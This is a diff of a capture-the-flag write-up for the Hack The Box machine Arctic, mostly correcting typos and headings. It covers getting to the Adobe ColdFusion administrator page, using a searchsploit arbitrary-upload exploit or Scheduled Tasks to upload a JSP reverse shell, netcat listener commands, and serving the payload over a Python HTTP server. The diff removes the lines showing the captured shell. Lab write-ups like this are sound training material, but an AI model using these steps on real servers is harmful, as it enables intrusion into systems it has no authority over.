@@ -18,7 +18,7 @@
 
 ![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/1.png)
 
-// after digging, we navigate to login page of Adobe ColdFusion==> http://10.10.10.11:8500/CFIDE/administrator/
+// After some digging, we navigate to login page of Adobe ColdFusion==> http://10.10.10.11:8500/CFIDE/administrator/
 
 ![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/2.png)
 
@@ -26,11 +26,11 @@
 
 ![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/3.png)
 
-// Also there is some exloits i found with searsploit(We will save that for later)
+// Also there is some exploits i found with searsploit(We will save that for later)
 
 ![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/12.png)
 
-// in the CVE what cougth my eye:
+// In the description what cougth my eye:
 
 ![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/4.png)
 
@@ -86,6 +86,7 @@
 
 
 // log into http://10.10.10.11:8500/CFIDE/administrator/
+
 // redirects us to http://10.10.10.11:8500/CFIDE/administrator/index.cfm
 
 ![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/6.png)
@@ -98,7 +99,7 @@
     Payload size: 1498 bytes
 
 
-###### == Upload reverse shell payload: way 1 ==
+#### == Upload reverse shell payload: way 1 ==
 
 // When we was searching for exploits with searsploit i notice ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)
 
@@ -139,22 +140,8 @@
     $ rlwrap nc -lvnp 1444
     listening on [any] 1444 ...
 
-// Navigate to 
 
-    http://10.10.10.11:8500/userfiles/file/OPVDTDQK.jsp
-
-// We got a shell !!!
-
-    $ rlwrap nc -lvnp 1444
-    listening on [any] 1444 ...
-    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.11] 49513
-    Microsoft Windows [Version 6.1.7600]
-    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-    C:\ColdFusion8\runtime\bin>
-
-
-###### == Upload reverse shell payload: way 2 ==
+#### == Upload reverse shell payload: way 2 ==
 
 // Digging the administrator dashboed we see option called Scheduled Tasks there we can upload a New Tasks in the Schedule Tasks
 
@@ -187,6 +174,9 @@
     $ sudo python3 -m http.server 80
     Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
     10.10.10.11 - - [07/Jul/2021 23:23:52] "GET /exp.jsp HTTP/1.1" 200 -
+
+
+
 
 // Navigatin to http:10.10.10.11:8500/ , we can see a new directory called /userfiles
 
